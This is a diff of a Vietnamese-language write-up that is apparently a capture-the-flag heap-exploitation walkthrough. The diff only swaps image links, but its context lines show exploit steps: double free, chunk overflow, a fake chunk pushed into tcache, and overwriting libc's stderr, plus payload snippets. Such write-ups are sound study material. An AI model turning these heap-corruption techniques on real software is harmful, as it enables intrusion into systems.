@@ -25,7 +25,7 @@
   malloc(size_ + 56, b'aaaa')
   freeandinfo(b'2')
   ```
-  - ![image](https://user-images.githubusercontent.com/113702087/220047525-8f9171a4-f8eb-4f37-9ea9-f344ff47e241.png)
+  - ![image](https://user-images.githubusercontent.com/113702087/220078906-f8d92564-7224-4794-896f-5c5904c9fdc3.png)
   - chunk đầu ta sẽ dùng double free, overflow nó để control các chunk dưới, và chứa lbic_stderr+30 để control size libc_stderr
   - chunk 2 ta đưa stderr, cấp phát vào stderr và thay đổi nó thành libc_stderr-0x30 thay đổi stderr ở chunk 1
   - chunk 3 đưa fakechunk vào để có thể free vào chunk mong muốn ( ở đây là chunk chứa libc)
@@ -40,7 +40,7 @@
   malloc(size_, b'a')
   malloc(size_, b'a')
   ```
-  - ![image](https://user-images.githubusercontent.com/113702087/220051030-a5ac7daf-cc2e-4fc3-a0a0-d91c349660ab.png)
+  - ![image](https://user-images.githubusercontent.com/113702087/220079920-00e4a33c-1fc8-4b36-a435-32a44e3e3f61.png)
   - thay đổi size libc_stderr và đưa vào tcache_c
   ```
   payload = b'\x00'*40 + p64(0x91)
@@ -48,4 +48,4 @@
   malloc(size_ + 24, b'\x87')
   freeandinfo(b'2')
   ```
-  - 
+  - ![image](https://user-images.githubusercontent.com/113702087/220081175-9c7c37e6-f9d1-4c71-999e-2e3d788289c4.png)
